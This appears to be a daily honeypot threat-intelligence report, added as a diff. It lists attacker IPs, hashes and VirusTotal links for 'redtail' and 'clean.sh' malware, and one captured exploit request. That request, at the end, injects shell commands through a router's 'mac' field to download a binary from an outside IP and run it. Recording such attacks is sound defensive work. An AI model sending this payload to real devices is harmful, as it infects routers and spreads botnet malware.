@@ -1,0 +1,38 @@
+Top 5 IPs for 28-08-2024 :
+
+14.116.250.8
+120.89.98.72
+157.245.194.78
+193.37.70.254
+161.132.47.241
+
+
+Malware Observed:
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File Name : redtail.arm7
+e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+https://www.virustotal.com/gui/file/e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+
+File Name : redtail.arm8
+a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+https://www.virustotal.com/gui/file/a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+
+File Name : redtail.i686
+ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+https://www.virustotal.com/gui/file/ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+
+File Name : redtail.x86_64
+44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+https://www.virustotal.com/gui/file/44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+
+Commands/exploits observed
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.245.236.156/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
+
